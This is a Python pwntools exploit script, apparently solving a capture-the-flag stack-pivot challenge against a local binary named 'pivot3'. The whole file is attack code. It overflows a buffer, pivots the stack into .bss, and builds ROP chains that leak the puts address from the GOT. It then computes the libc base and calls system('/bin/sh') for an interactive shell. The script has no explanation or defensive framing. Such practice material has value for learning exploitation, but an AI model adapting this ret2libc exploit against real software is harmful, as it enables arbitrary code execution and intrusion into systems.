from pwn import *

p = process('./pivot3')
e = ELF('./pivot3')
libc = e.libc

leave_ret = 0x40071e
pop_rdi = 0x400783
pop_rsi_r15 = 0x400781

bss = e.bss() + 0x300
read_plt = e.plt['read']

puts_plt = e.plt['puts']
puts_got = e.got['puts']


payload = b'A' * 0x30
payload += p64(bss)         # SFP
payload += p64(pop_rdi) + p64(0)    # RET
payload += p64(pop_rsi_r15) + p64(bss) + p64(0)
# rdx = 0x70
payload += p64(read_plt)
payload += p64(leave_ret)

#pause()
p.send(payload)



payload = p64(bss+0x100)
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss+0x100) + p64(0)
payload += p64(read_plt)
payload += p64(leave_ret)

p.send(payload)

leak = u64(p.recv(6).ljust(8, b'\x00'))
log.success('leak = ' + hex(leak))
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

log.success('libc_base = ' + hex(libc_base))



payload = p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(binsh)
#payload += p64(0x40053e) # ret
payload += p64(system)

pause()
p.send(payload)

p.interactive()
